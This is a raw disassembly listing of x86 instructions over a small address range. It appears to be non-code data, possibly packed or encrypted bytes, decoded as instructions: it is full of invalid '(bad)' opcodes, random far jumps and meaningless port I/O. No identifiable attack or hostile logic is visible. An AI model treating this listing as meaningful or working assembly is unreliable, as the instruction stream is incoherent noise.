  420899:	sub    cl,BYTE PTR [ecx+0x4c]
  42089c:	pop    esp
  42089d:	push   0xfb5a2b97
  4208a2:	sub    eax,0x729875e0
  4208a7:	adc    ebx,DWORD PTR [eax+ecx*2-0x31]
  4208ab:	xor    al,0x2e
  4208ad:	lea    edi,[edx-0x42]
  4208b0:	sub    ecx,DWORD PTR [eax+0x1b]
  4208b3:	gs pop ebp
  4208b5:	mov    cl,0x5c
  4208b7:	xchg   ecx,eax
  4208b8:	xchg   BYTE PTR [edi-0x40],al
  4208bb:	push   esp
  4208bc:	out    0x97,al
  4208be:	fs mov ecx,0xcc386e4f
  4208c4:	and    DWORD PTR [esi+0x59],esi
  4208c7:	(bad)  
  4208c8:	or     DWORD PTR [edi+0x10],edi
  4208cb:	push   esi
  4208cc:	outs   dx,BYTE PTR ds:[esi]
  4208cd:	push   edx
  4208ce:	xchg   DWORD PTR [edi-0x63],esp
  4208d1:	adc    bl,ah
  4208d3:	outs   dx,BYTE PTR ds:[esi]
  4208d4:	fisubr WORD PTR [ecx+0x74]
  4208d7:	xor    DWORD PTR [eax],esp
  4208d9:	jp     0x4208a1
  4208db:	hlt    
  4208dc:	jl     0x42089c
  4208de:	fild   WORD PTR [ecx-0xce8fedb]
  4208e4:	jb     0x42095f
  4208e6:	stos   DWORD PTR es:[edi],eax
  4208e7:	ja     0x420962
  4208e9:	jecxz  0x4208ad
  4208eb:	idiv   DWORD PTR [ebx]
  4208ed:	inc    ebx
  4208ee:	imul   esi,DWORD PTR [edx],0xffffffaf
  4208f1:	fdivr  QWORD PTR [ecx-0x73]
  4208f4:	retf   
  4208f5:	push   ebx
  4208f6:	push   esp
  4208f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f8:	mov    BYTE PTR [edi-0x3bc00a8a],bl
  4208fe:	gs sti 
  420900:	add    bl,dh
  420902:	mov    bh,0x32
  420904:	jnp    0x42092e
  420906:	mov    dh,0xa1
  420908:	fsubrp st(3),st
  42090a:	or     BYTE PTR [edx-0x571447f0],dh
  420910:	cmp    eax,0xa7196fce
  420915:	test   al,0x21
  420917:	cdq    
  420918:	xchg   ebx,eax
  420919:	loopne 0x4208f5
  42091b:	imul   ecx,DWORD PTR [eax+edx*8-0x1b],0xd3ec631d
  420923:	cwde   
  420924:	pop    es
  420925:	xlat   BYTE PTR ds:[ebx]
  420926:	fist   WORD PTR [bx+di-0x2a]
  42092a:	jecxz  0x42095e
  42092c:	add    BYTE PTR [ebp+0x680d6206],dl
  420932:	push   edi
  420933:	into   
  420934:	cdq    
  420935:	mov    edx,es
  420937:	retf   
  420938:	pop    esi
  420939:	test   eax,0xd8c4a651
  42093e:	add    eax,0x65b88063
  420943:	int3   
  420944:	adc    BYTE PTR [ecx],dl
  420946:	sahf   
  420947:	dec    ebx
  420948:	ins    BYTE PTR es:[edi],dx
  420949:	fild   DWORD PTR ds:0x5af5415
  42094f:	inc    eax
  420950:	fidivr DWORD PTR [ebp+0x74]
  420953:	mov    dh,BYTE PTR [edi-0x48021f88]
  420959:	push   ss
  42095a:	fistp  QWORD PTR [ebp+0x75d00d47]
  420960:	lahf   
  420961:	dec    esp
  420962:	lods   eax,DWORD PTR ds:[esi]
  420963:	push   ebx
  420964:	adc    BYTE PTR ds:0xa4f802ac,bl
  42096a:	retf   
  42096b:	retf   0x5cd6
  42096e:	out    dx,al
  42096f:	sbb    BYTE PTR ds:0xf7f92a7b,dl
  420975:	ret    
  420976:	shr    BYTE PTR [ebx+0x30],1
  420979:	mov    al,ds:0x1fb8c32b
  42097e:	dec    edx
  42097f:	cmp    al,0xa1
  420981:	adc    eax,0xba0252e5
  420986:	add    al,0x35
  420988:	jmp    0x455140ac
  42098d:	fnsave [ecx+edx*1]
  420990:	sar    BYTE PTR [edi-0x35],1
  420993:	and    ch,bh
  420995:	xor    dh,BYTE PTR [edx-0x52d119df]
  42099b:	test   edi,esp
  42099d:	fs in  al,0xc0
  4209a0:	jmp    edx
  4209a2:	inc    esp
  4209a3:	cmp    DWORD PTR [ebx+0x9],ecx
  4209a6:	sub    al,0xcb
  4209a8:	add    BYTE PTR [edx-0x58f1d6a8],cl
  4209ae:	jo     0x4209ab
  4209b0:	retf   0xe29
  4209b3:	sub    eax,0xa63a0640
  4209b8:	xor    eax,0x8c0b07ab
  4209bd:	test   dh,cl
  4209bf:	push   esi
  4209c0:	out    dx,al
  4209c1:	mov    ebx,0x5147d4b5
  4209c6:	push   ebp
  4209c7:	sbb    BYTE PTR ds:0x715e1070,0xe5
  4209ce:	inc    edi
  4209cf:	mov    ah,0xf4
  4209d1:	inc    ebx
  4209d2:	mov    ds:0x9b6edfd0,eax
  4209d7:	call   0x84d2dee
  4209dc:	jnp    0x4209c6
  4209de:	rcl    ebx,cl
  4209e0:	dec    ecx
  4209e1:	es fwait
  4209e3:	xor    ebp,edi
  4209e5:	in     al,dx
  4209e6:	mov    bh,0xc6
  4209e8:	or     al,0x38
  4209ea:	js     0x420998
  4209ec:	xchg   BYTE PTR [ebp+eiz*8+0x78],dl
  4209f0:	pop    ebx
  4209f1:	mov    bh,ah
  4209f3:	cmp    al,0xac
  4209f5:	iret   
  4209f6:	sbb    DWORD PTR [ecx],edx
  4209f8:	(bad)  
  4209f9:	jl     0x420a6d
  4209fb:	dec    ebp
  4209fc:	fs (bad) 
  4209fe:	je     0x4209b6
  420a00:	repnz stos DWORD PTR es:[edi],eax
  420a02:	mov    esp,0x6995363
  420a07:	leave  
  420a08:	inc    edx
  420a09:	cmp    al,0xfd
  420a0b:	cs add eax,ecx
  420a0e:	je     0x420a22
  420a10:	imul   esi,DWORD PTR [edx-0x73],0x42
  420a14:	(bad)  
  420a15:	pop    ecx
  420a16:	pop    eax
  420a17:	idiv   BYTE PTR [edi-0x7f]
  420a1a:	in     eax,dx
  420a1b:	cs mov DWORD PTR fs:[ebx+0x3a],ebp
  420a20:	scas   eax,DWORD PTR es:[edi]
  420a21:	shr    DWORD PTR [edi+edi*2],1
  420a24:	cmc    
  420a25:	sub    ah,0x96
  420a28:	aaa    
  420a29:	es cdq 
  420a2b:	mov    al,ds:0x4a0a4a17
  420a30:	mov    edi,DWORD PTR [edi]
  420a32:	mov    al,0xd8
  420a34:	jmp    0x9e47:0x2f0befe6
  420a3b:	frstor [ecx+0x2f]
  420a3e:	and    BYTE PTR [esi+esi*4],bl
  420a41:	pop    eax
  420a42:	push   esp
  420a43:	jae    0x420a75
  420a45:	and    eax,0xe4507b8c
  420a4a:	repz inc DWORD PTR [ebx-0x4c]
  420a4e:	cld    
  420a4f:	loopne 0x420a89
  420a51:	imul   ebp,DWORD PTR [edx+0x3b],0xc8b6988f
  420a58:	div    DWORD PTR [ebx+0x78eea7fc]
  420a5e:	sub    ebp,ecx
  420a60:	pushf  
  420a61:	adc    edi,eax
  420a63:	pop    ebx
  420a64:	jmp    0x420a60
  420a66:	retf   
  420a67:	cmp    al,0x6c
  420a69:	cmp    BYTE PTR [edi],0xf7
  420a6c:	push   esi
  420a6d:	fadd   QWORD PTR [edi+0x3e]
  420a70:	mov    ebp,0x83b4997e
  420a75:	xchg   esi,eax
  420a76:	imul   ebp,DWORD PTR [eax+eax*8],0x58
  420a7a:	ret    
  420a7b:	push   eax
  420a7c:	push   eax
  420a7d:	(bad)  
  420a7e:	idiv   DWORD PTR [edx-0x3326781b]
  420a84:	jge    0x420ace
  420a86:	test   ah,bh
  420a88:	sahf   
  420a89:	daa    
  420a8a:	push   0xad8dc4d4
  420a8f:	imul   ebx,DWORD PTR [ecx],0x6c5c1cf9
  420a95:	aad    0x69
  420a97:	rol    BYTE PTR [edi+eiz*1-0x519b4a03],0xd3
  420a9f:	cmp    al,0x77
  420aa1:	js     0x420b22
  420aa3:	test   ah,0xa1
  420aa6:	jmp    0x420af5
  420aa8:	push   edx
  420aa9:	cdq    
  420aaa:	add    al,0x1d
  420aac:	xor    eax,0xc5210c7d
  420ab1:	sti    
  420ab2:	push   ebx
  420ab3:	add    edi,DWORD PTR [ecx+edi*1]
  420ab6:	push   ds
  420ab7:	inc    DWORD PTR [edi+eiz*1-0x3f48ecdb]
  420abe:	fs inc eax
  420ac0:	dec    esp
  420ac1:	arpl   WORD PTR [ecx+0x49],di
  420ac4:	aam    0xa6
  420ac6:	addr16 hlt 
  420ac8:	xchg   ecx,eax
  420ac9:	imul   ebp,ecx,0xffffffd9
  420acc:	jae    0x420b4a
  420ace:	mov    esp,0xf1e91bd0
  420ad3:	mov    dh,0x3d
  420ad5:	adc    ebp,ebp
  420ad7:	jno    0x420a64
  420ad9:	xchg   edi,eax
  420ada:	adc    al,0xa0
  420adc:	leave  
  420add:	(bad)  
  420ade:	je     0x420ae5
  420ae0:	cmp    DWORD PTR [eax-0x57],edi
  420ae3:	xchg   edi,eax
  420ae4:	cmp    edx,eax
  420ae6:	inc    edi
  420ae7:	ins    BYTE PTR es:[edi],dx
  420ae8:	jge    0x420aeb
  420aea:	sub    BYTE PTR [eax-0x65],0x53
  420aee:	xchg   edi,eax
  420aef:	ret    
  420af0:	in     eax,dx
  420af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420af2:	push   ebx
  420af3:	mov    ds,eax
  420af5:	or     edx,edx
  420af7:	lahf   
  420af8:	fidiv  WORD PTR [esi]
  420afa:	xchg   edx,eax
  420afb:	pop    ss
  420afc:	jp     0x420ac7
  420afe:	inc    esi
  420aff:	rol    dl,1
  420b01:	loope  0x420b2a
  420b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b04:	dec    esp
  420b05:	ret    
  420b06:	aaa    
  420b07:	(bad)  
  420b08:	retf   
  420b09:	mov    DWORD PTR [edx+0x43ed1301],ebx
  420b0f:	fwait
  420b10:	xor    bh,BYTE PTR [edi+0x20]
  420b13:	or     DWORD PTR [edx+0x72],ecx
  420b16:	js     0x420aa4
  420b18:	clc    
  420b19:	xchg   esp,eax
  420b1a:	pusha  
  420b1b:	popf   
  420b1c:	and    ebp,DWORD PTR ds:[esp+ebp*2+0x35491384]
  420b24:	push   ecx
  420b25:	imul   ecx,DWORD PTR [edi+ebp*1],0xb
  420b29:	jbe    0x420b45
  420b2b:	shl    DWORD PTR [ecx-0x1b],0xe7
  420b2f:	mov    BYTE PTR [ebx+0x5db4d49f],al
  420b35:	mov    edi,0xab96f4eb
  420b3a:	push   ebx
  420b3b:	jmp    0x9c87:0x4bd9d7f6
  420b42:	inc    ecx
  420b43:	dec    edi
  420b44:	cmp    eax,0x139815c3
  420b49:	push   esp
  420b4a:	and    DWORD PTR [edi],ecx
  420b4c:	rcl    DWORD PTR [ebp-0x470b0f80],0xce
  420b53:	sbb    eax,0x90273153
  420b58:	pop    esp
  420b59:	in     al,dx
  420b5a:	lds    ebp,FWORD PTR [esi]
  420b5c:	push   edi
  420b5d:	add    eax,0x5ccf35de
  420b62:	cmp    DWORD PTR cs:[edi+0x5a],ebx
  420b66:	lods   al,BYTE PTR ds:[esi]
  420b67:	scas   al,BYTE PTR es:[edi]
  420b68:	test   BYTE PTR [eax-0x56],ch
  420b6b:	push   0x7a787b30
  420b70:	push   ebp
  420b71:	sbb    eax,0x126b8b54
  420b76:	push   ebp
  420b77:	fwait
  420b78:	adc    BYTE PTR [ebp+edx*4-0x2e],ch
  420b7c:	sbb    eax,eax
  420b7e:	fistp  DWORD PTR [ebp+0x18]
  420b81:	lahf   
  420b82:	fbld   TBYTE PTR [ebp+0x42]
  420b85:	sbb    eax,0x38d59fe7
  420b8a:	nop
  420b8b:	aas    
  420b8c:	stos   DWORD PTR es:[edi],eax
  420b8d:	unpcklps xmm1,XMMWORD PTR [ebx]
  420b90:	popa   
  420b91:	fistp  DWORD PTR [ebx]
  420b93:	bound  ebp,QWORD PTR [ecx]
  420b95:	lock mov esp,0x842f2b91
  420b9b:	jle    0x420b41
  420b9d:	shl    BYTE PTR [esi],1
  420b9f:	or     al,BYTE PTR [edx-0x36d3aeca]
  420ba5:	push   esp
  420ba6:	mov    ch,BYTE PTR [eax+edi*1-0x74030dac]
  420bad:	add    eax,DWORD PTR [edx+edx*1]
  420bb0:	add    al,0x19
  420bb2:	fcmovnb st,st(7)
  420bb4:	(bad)  
  420bb5:	adc    al,0x14
  420bb7:	outs   dx,DWORD PTR ds:[esi]
  420bb8:	mov    ecx,es
  420bba:	or     eax,0x4254744
  420bbf:	mov    BYTE PTR [ebx],cl
  420bc1:	or     ebp,DWORD PTR [ebx+ebp*8+0x72]
  420bc5:	(bad)  
  420bc6:	mov    bh,0xd9
  420bc8:	js     0x420bbc
  420bca:	add    eax,0xa18ffd
  420bcf:	lahf   
  420bd0:	xor    eax,0x4604d619
  420bd5:	popa   
  420bd6:	in     al,0x8e
  420bd8:	inc    esp
  420bd9:	mov    al,0x3e
  420bdb:	hlt    
  420bdc:	iret   
  420bdd:	in     al,dx
  420bde:	or     al,0xb3
  420be0:	aam    0x2f
  420be2:	mov    bl,al
  420be4:	daa    
  420be5:	idiv   BYTE PTR [edi-0xd2c373a]
  420beb:	push   ss
  420bec:	xchg   ecx,eax
  420bed:	and    esp,DWORD PTR [edx+0x6a]
  420bf0:	sar    DWORD PTR [ebp+0x58],0xf7
  420bf4:	ret    
  420bf5:	sub    DWORD PTR [ebx],0xffffffcf
  420bf8:	pop    edi
  420bf9:	dec    eax
  420bfa:	inc    eax
  420bfb:	xchg   DWORD PTR [edx+0x2],esp
  420bfe:	push   ebp
  420bff:	mov    esp,0xd6307387
  420c04:	sbb    BYTE PTR [esp+ebp*1],bh
  420c07:	popf   
  420c08:	cmp    edx,DWORD PTR [esi+0x72]
  420c0b:	jmp    0xa58d:0xefbc350
  420c12:	aas    
  420c13:	(bad)  
  420c15:	adc    eax,0xd71d43d4
  420c1a:	sub    cl,BYTE PTR [eax]
  420c1c:	in     eax,0xa7
  420c1e:	cs jb  0x420c8b
  420c21:	in     eax,0x78
  420c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c24:	leave  
  420c25:	enterw 0x784a,0xb8
  420c2a:	(bad)  
  420c2b:	aas    
  420c2c:	push   ss
  420c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c2e:	into   
  420c2f:	and    ebx,esi
  420c31:	xor    BYTE PTR [esi+0x14bb3478],bl
  420c37:	hlt    
  420c38:	and    ecx,DWORD PTR [esi]
  420c3a:	jmp    ebp
  420c3c:	push   ss
  420c3d:	pop    esi
  420c3e:	pop    edi
  420c3f:	mov    edi,0x9b819a92
  420c44:	aaa    
  420c45:	mov    ebx,0xd19cd14d
  420c4b:	xlat   BYTE PTR ds:[ebx]
  420c4c:	retf   0x1eed
  420c4f:	(bad)  
  420c50:	push   0xffffffc1
  420c52:	xor    eax,0x85d6f68b
  420c57:	push   es
  420c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c59:	lock pop ecx
  420c5b:	imul   esp,DWORD PTR [ecx+0x76],0x7a41d75b
  420c62:	mov    ch,BYTE PTR [esp+ebx*8+0x7e3309cd]
  420c69:	xchg   edi,eax
  420c6a:	mov    al,ds:0x6b15
  420c6f:	add    BYTE PTR [eax],al
  420c71:	add    BYTE PTR [ecx],al
  420c73:	jge    0x420c4d
  420c75:	mov    ebp,0xfd65bdfc
  420c7a:	or     cl,BYTE PTR [ecx+0x494eb857]
  420c80:	push   edi
  420c81:	retf   0x86a5
  420c84:	add    DWORD PTR [eax],eax
  420c86:	repz add al,0x0
  420c89:	add    bl,bh
  420c8b:	jmp    0xeb02:0xc628fd9c
  420c92:	add    al,0x71
  420c94:	and    dh,bl
  420c96:	jb     0x420ca0
  420c98:	daa    
  420c99:	xor    al,0x66
  420c9b:	cmp    eax,0xf7a2931f
  420ca0:	pop    eax
  420ca1:	and    DWORD PTR [esi-0x43d444cc],ecx
  420ca7:	cdq    
  420ca8:	lods   eax,DWORD PTR ds:[esi]
  420ca9:	mov    BYTE PTR [ebx+0x726ffd07],ah
  420caf:	pusha  
  420cb0:	cmp    DWORD PTR [ecx-0x1d],0xe432b29
  420cb7:	stc    
  420cb8:	sub    BYTE PTR [esi-0xcd6f854],dh
  420cbe:	adc    al,0xb7
  420cc0:	ja     0x420c8b
  420cc2:	ret    0xc062
  420cc5:	(bad)  
  420cc6:	mov    ah,0xed
  420cc8:	iret   
  420cc9:	mov    cl,0x63
  420ccb:	push   ss
  420ccc:	popf   
  420ccd:	pop    esi
  420cce:	(bad)  
  420ccf:	sbb    DWORD PTR [ecx+0x6715cf],esi
  420cd5:	out    dx,eax
  420cd6:	mov    eax,ds:0xb577dd23
  420cdb:	iret   
  420cdc:	into   
  420cdd:	inc    eax
  420cde:	outs   dx,BYTE PTR ds:[esi]
  420cdf:	test   eax,0x475b289a
  420ce4:	dec    ebp
  420ce5:	or     BYTE PTR [esi],dl
  420ce7:	adc    DWORD PTR [di-0x29],eax
  420ceb:	fnstcw WORD PTR [eax+edi*8-0x21]
  420cef:	ret    
  420cf0:	retf   0x49bb
  420cf3:	leave  
  420cf4:	stc    
  420cf5:	fs cmp DWORD PTR cs:[ecx],ebx
  420cf9:	pop    ds
  420cfa:	mov    ebp,0xd810d0b9
  420cff:	je     0x420d11
  420d01:	push   cs
  420d02:	mov    al,0x6
  420d04:	arpl   sp,ax
  420d06:	mov    dl,bl
  420d08:	scas   eax,DWORD PTR es:[edi]
  420d09:	fadd   QWORD PTR [ebp+0x57]
  420d0c:	mov    esp,0xb6ff6633
  420d11:	ror    BYTE PTR [ebx-0x4df2351f],1
  420d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d18:	xor    edx,DWORD PTR [eax+0x15]
  420d1b:	or     esi,DWORD PTR [eax+0x37]
  420d1e:	jbe    0x420d6f
  420d20:	ret    
  420d21:	fcmovb st,st(6)
  420d23:	lock cdq 
  420d25:	xor    BYTE PTR [edi+0x44],dh
  420d28:	xchg   esp,eax
  420d29:	js     0x420cbf
  420d2b:	pop    ss
  420d2c:	sbb    ah,ah
  420d2e:	xor    BYTE PTR [eax-0x68],cl
  420d31:	mov    esi,0xb76f1c4b
  420d36:	ror    BYTE PTR [eax],1
  420d38:	mov    esp,0xe9ca2e85
  420d3d:	out    0x65,al
  420d3f:	fisttp DWORD PTR [edx]
  420d41:	loope  0x420d30
  420d43:	cwde   
  420d44:	shr    DWORD PTR [edi+0x19d0bf9f],0xe3
  420d4b:	ds jg  0x420cd1
  420d4e:	xchg   edi,eax
  420d4f:	mov    al,0x6c
  420d51:	iret   
  420d52:	jbe    0x420da1
  420d54:	ror    BYTE PTR [ecx],0x85
  420d57:	adc    eax,0xf7122812
  420d5c:	cmp    BYTE PTR [esp+eiz*2-0x18],ah
  420d60:	and    ah,BYTE PTR [ebp+0x8]
  420d63:	test   eax,0xb0df0c42
  420d68:	loope  0x420d9f
  420d6a:	push   0x66
  420d6c:	dec    edx
  420d6d:	or     al,bl
  420d6f:	outs   dx,DWORD PTR ds:[esi]
  420d70:	pop    eax
  420d71:	sbb    DWORD PTR [eax+0x8f12d78],ebp
  420d77:	jecxz  0x420dd2
  420d79:	ret    
  420d7a:	push   edi
  420d7b:	xor    eax,0x524629ca
  420d80:	stos   BYTE PTR es:[edi],al
  420d81:	push   es
  420d82:	xchg   esp,eax
  420d83:	pop    ebx
  420d84:	ror    DWORD PTR ds:0xb804ce98,cl
  420d8a:	xor    bh,BYTE PTR [ebx+eax*4+0x10b91e0f]
  420d91:	or     BYTE PTR [ecx+0x8],ch
  420d94:	mov    ebp,0x265c1f78
  420d99:	inc    esi
  420d9a:	pop    ecx
  420d9b:	jge    0x420de1
  420d9d:	gs ins DWORD PTR es:[edi],dx
  420d9f:	rcl    BYTE PTR [ebx+edi*2-0x43c6f092],1
  420da6:	mov    al,BYTE PTR [edx+0x6c]
  420da9:	and    BYTE PTR [esi+eiz*2-0x21098876],ah
  420db0:	stos   BYTE PTR es:[edi],al
  420db1:	mov    ecx,0xc7f50043
  420db6:	into   
  420db7:	add    al,0x8d
  420db9:	mov    ah,0x42
  420dbb:	mov    eax,0x4b9e30b9
  420dc0:	add    eax,DWORD PTR [esi]
  420dc2:	pop    ss
  420dc3:	mov    ss:0x67813b16,al
  420dc9:	ret    0xe90b
  420dcc:	faddp  st(4),st
  420dce:	pop    esi
  420dcf:	adc    al,0xbd
  420dd1:	repnz les esp,FWORD PTR [eax]
  420dd4:	jecxz  0x420d7d
  420dd6:	mov    al,0x7
  420dd8:	lds    ecx,FWORD PTR es:[edi+ebx*8+0x3f]
  420ddd:	adc    cl,0x7d
  420de0:	(bad)  
  420de1:	leave  
  420de2:	in     al,dx
  420de3:	fidiv  WORD PTR [ebx]
  420de5:	inc    esi
  420de6:	pop    edx
  420de7:	fadd   st,st(2)
  420de9:	lods   al,BYTE PTR ds:[esi]
  420dea:	stc    
  420deb:	push   ebx
  420dec:	(bad)  
  420ded:	leave  
  420dee:	popf   
  420def:	mov    bh,0xa1
  420df1:	lods   eax,DWORD PTR ds:[esi]
  420df2:	test   DWORD PTR [ebp+ebx*4+0x7b],ebx
  420df6:	sbb    eax,0xe03379f
  420dfb:	adc    esi,DWORD PTR [eax+esi*2]
  420dfe:	and    BYTE PTR [ebx+0x21],bh
  420e01:	fnstcw WORD PTR [esi-0x65]
  420e04:	mov    ds:0x6a277c4d,eax
  420e09:	adc    al,0x77
  420e0b:	xor    eax,0x5e596175
  420e10:	loop   0x420e59
  420e12:	jmp    0x420d99
  420e14:	(bad)  
  420e15:	mov    ah,0x81
  420e17:	scas   al,BYTE PTR es:[edi]
  420e18:	das    
  420e19:	push   es
  420e1a:	test   DWORD PTR [esi],0x8c4dd200
  420e20:	(bad)  
  420e21:	jno    0x420da5
  420e23:	clc    
  420e24:	rcr    BYTE PTR [esi+ebx*2-0x23432109],1
  420e2b:	inc    esp
  420e2c:	leave  
  420e2d:	jb     0x420e64
  420e2f:	out    0xe7,eax
  420e31:	jb     0x420e3f
  420e33:	and    eax,DWORD PTR [ebx-0x7a91b32b]
  420e39:	popf   
  420e3a:	mov    ?,WORD PTR [edx-0x2cab7564]
  420e40:	scas   al,BYTE PTR es:[edi]
  420e41:	dec    edi
  420e42:	mov    WORD PTR [edi+0x3],fs
  420e45:	pop    ds
  420e46:	sbb    DWORD PTR [edx-0x1c0f0501],ebx
  420e4c:	shl    bh,1
  420e4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e4f:	fstp   TBYTE PTR [edx+0x42c92662]
  420e55:	cli    
  420e56:	push   es
  420e57:	inc    edx
  420e58:	or     edi,DWORD PTR [esi-0x67a020bd]
  420e5e:	out    0xd6,al
  420e60:	fisttp QWORD PTR ds:0x2ad7ba24
  420e66:	or     dh,BYTE PTR [ebp+0x1f0f94c]
  420e6c:	pop    edx
  420e6d:	das    
  420e6e:	or     eax,ebx
  420e70:	add    ebx,ecx
  420e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e73:	sbb    dh,BYTE PTR [esi]
  420e75:	jbe    0x420e67
  420e77:	aad    0x97
  420e79:	inc    ebp
  420e7a:	cmp    ah,BYTE PTR [edx-0x6c14106]
  420e80:	jb     0x420e1e
  420e82:	lahf   
  420e83:	jle    0x420ee8
  420e85:	and    eax,0x20c4a533
  420e8a:	and    ch,BYTE PTR [edx]
  420e8c:	test   BYTE PTR [edx+0xb],0x1e
  420e90:	cld    
  420e91:	rcr    DWORD PTR [esi-0x28],cl
  420e94:	jg     0x420e46
  420e96:	jmp    0x420e2d
  420e98:	and    al,0x8d
  420e9a:	dec    esi
  420e9b:	xor    DWORD PTR [edx+0x3d],0xffffff8d
  420e9f:	and    DWORD PTR [ecx-0x79c49cd1],ebp
  420ea5:	pop    eax
  420ea6:	imul   edx,edx,0x5bf0a007
  420eac:	popa   
  420ead:	hlt    
  420eae:	shr    DWORD PTR [ebp-0x21c0c7a],cl
  420eb4:	cs popf 
  420eb6:	push   0x532fd528
  420ebb:	jmp    0xc4ca699c
  420ec0:	mov    ds:0x7d20e4ac,al
  420ec5:	ins    BYTE PTR es:[edi],dx
  420ec6:	ins    DWORD PTR es:[edi],dx
  420ec7:	mov    esi,0x959f263b
  420ecc:	mov    edx,edx
  420ece:	fisubr WORD PTR [ebp+0x36]
  420ed1:	sub    edi,DWORD PTR [ecx+0x7e]
  420ed4:	mov    al,0x7b
  420ed6:	push   eax
  420ed7:	std    
  420ed8:	ja     0x420f41
  420eda:	repz pop ebx
  420edc:	xchg   esp,eax
  420edd:	jmp    FWORD PTR [edi-0x5b]
  420ee0:	les    ebp,FWORD PTR [eax-0x13b546de]
  420ee6:	outs   dx,BYTE PTR ds:[esi]
  420ee7:	loopne 0x420e8c
  420ee9:	mov    ch,0x8c
  420eeb:	call   0x63020121
  420ef0:	cmp    eax,DWORD PTR [edx+edi*1]
  420ef3:	and    eax,0xec6e9d2d
  420ef8:	mov    WORD PTR [ebx],?
  420efa:	fnstenv [esi+0x5c]
  420efd:	inc    edx
  420efe:	cwde   
  420eff:	jecxz  0x420ee5
  420f01:	int3   
  420f02:	pop    ebx
  420f03:	neg    ch
  420f05:	mov    edi,0x5900ed67
  420f0a:	and    dh,dl
  420f0c:	sbb    cl,BYTE PTR [edi]
  420f0e:	dec    esi
  420f0f:	cld    
  420f10:	out    dx,eax
  420f11:	cmp    BYTE PTR [ebx+0x2],dh
  420f14:	mov    WORD PTR [edi+0x4a],cs
  420f17:	xchg   edi,eax
  420f18:	call   0x9151:0x70afb92c
  420f1f:	inc    edx
  420f20:	(bad)  
  420f21:	loop   0x420f3e
  420f23:	int    0x7a
  420f25:	dec    edx
  420f26:	xchg   DWORD PTR [esi],ebx
  420f28:	div    eax
  420f2a:	cli    
  420f2b:	test   BYTE PTR [ecx+0x34],bl
  420f2e:	outs   dx,BYTE PTR ds:[esi]
  420f2f:	mov    dl,0x89
  420f31:	rcl    esp,0xf1
  420f34:	push   0xffffffe8
  420f36:	mov    al,0xb6
  420f38:	jge    0x420f7f
  420f3a:	mov    cl,0x4
  420f3c:	add    ebx,edi
  420f3e:	mov    bh,BYTE PTR [eax+0x5e]
  420f41:	pop    ds
  420f42:	iret   
  420f43:	or     al,0x9f
  420f45:	jmp    0xe351:0x7c06e23b
  420f4c:	add    al,0x69
  420f4e:	adc    BYTE PTR [edx-0x382291b],0x50
  420f55:	jne    0x420f7c
  420f57:	inc    eax
  420f58:	add    DWORD PTR [edx+edi*2],ecx
  420f5b:	mov    ds:0xdcbdfe36,al
  420f60:	sbb    dl,BYTE PTR [esi+0x12]
  420f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f64:	in     al,0x2f
  420f66:	sti    
  420f67:	push   0xffffff9f
  420f69:	int    0x3d
  420f6b:	ret    0xc3be
  420f6e:	sbb    BYTE PTR gs:[esi-0x108dd24c],ah
  420f75:	dec    edi
  420f76:	pop    edx
  420f77:	sub    DWORD PTR [edx],esi
  420f79:	fisub  DWORD PTR [ebx+0x6a]
  420f7c:	dec    ecx
  420f7d:	ins    BYTE PTR es:[edi],dx
  420f7e:	inc    esi
  420f7f:	and    ebp,DWORD PTR [esi]
  420f81:	sub    eax,DWORD PTR [ecx]
  420f83:	and    ch,BYTE PTR fs:[ecx+0x46]
  420f87:	lds    ecx,FWORD PTR [ebx-0x4cff7388]
  420f8d:	rol    BYTE PTR [ebx+0x44dc7dc1],cl
  420f93:	in     al,0xd9
  420f95:	pop    eax
  420f96:	cmp    BYTE PTR [ebx],bl
  420f98:	dec    ebx
  420f99:	xchg   ecx,eax
  420f9a:	shl    DWORD PTR [eax+ebp*1-0x3f],0x67
  420f9f:	ja     0x421000
  420fa1:	stc    
  420fa2:	ret    0x69a2
  420fa5:	add    esi,DWORD PTR [ebx+ebp*4+0x32]
  420fa9:	pop    esp
  420faa:	cdq    
  420fab:	loop   0x420f61
  420fad:	mov    fs,ebx
  420faf:	das    
  420fb0:	das    
  420fb1:	push   edi
  420fb2:	jmp    0x420f8b
  420fb4:	stc    
  420fb5:	cli    
  420fb6:	out    dx,eax
  420fb7:	sbb    ah,BYTE PTR [ecx-0x30]
  420fba:	jp     0x420f6c
  420fbc:	(bad)  
  420fbd:	jb     0x420f86
  420fbf:	mov    al,ds:0x2634b588
  420fc4:	rcl    DWORD PTR [eax],0x65
  420fc7:	pop    esi
  420fc8:	add    DWORD PTR [edx-0x40],0x5b5766b3
  420fcf:	mov    eax,ds:0xf05262db
  420fd4:	stos   DWORD PTR es:[edi],eax
  420fd5:	fs (bad) 
  420fd7:	mov    ecx,eax
  420fd9:	retf   0x7240
  420fdc:	push   ebx
  420fdd:	out    dx,eax
  420fde:	mov    es,WORD PTR [esi]
  420fe0:	imul   ecx,ebp,0xace5625b
  420fe6:	pop    ebp
  420fe7:	push   edi
  420fe8:	push   esi
  420fe9:	scas   eax,DWORD PTR es:[edi]
  420fea:	pop    ecx
  420feb:	xchg   esi,eax
  420fec:	imul   DWORD PTR [ebx+edi*2-0x1]
  420ff0:	xor    ebx,DWORD PTR [ebx-0x418be3cd]
  420ff6:	hlt    
  420ff7:	call   0x904b:0x10fd1fe8
  420ffe:	bound  ecx,QWORD PTR [edi+edx*8+0x28]
  421002:	pop    ds
  421003:	retf   
  421004:	inc    ebp
  421005:	(bad)  
  421006:	pop    ecx
  421007:	xchg   esi,eax
  421008:	daa    
  421009:	pushf  
  42100a:	xlat   BYTE PTR ds:[ebx]
  42100b:	mov    bl,0x1c
  42100d:	adc    eax,0xb39f449c
  421012:	push   ebx
  421013:	push   esp
  421014:	sbb    al,0x5
  421016:	bound  edi,QWORD PTR [esi+0x68]
  421019:	pop    esp
  42101a:	dec    ecx
  42101b:	sbb    dl,al
  42101d:	push   edx
  42101e:	(bad)  
  42101f:	xor    dl,0x98
  421022:	pop    edx
